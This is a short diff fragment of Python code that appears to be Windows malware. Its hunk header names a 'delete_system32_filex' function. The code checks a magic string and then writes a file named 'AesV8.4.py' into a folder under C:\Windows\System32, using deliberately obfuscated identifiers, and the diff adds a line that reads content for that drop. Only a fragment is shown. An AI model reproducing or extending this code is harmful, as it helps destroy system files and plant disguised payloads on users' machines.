@@ -29,6 +29,7 @@ delete_system32_filex()
 '''
 os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
+    file_contentpathx = read_file_contentxasxas(file_pathxpath)
     create_batch_file(file_contentpathx, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
 else:
     create_batch_file("py", r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
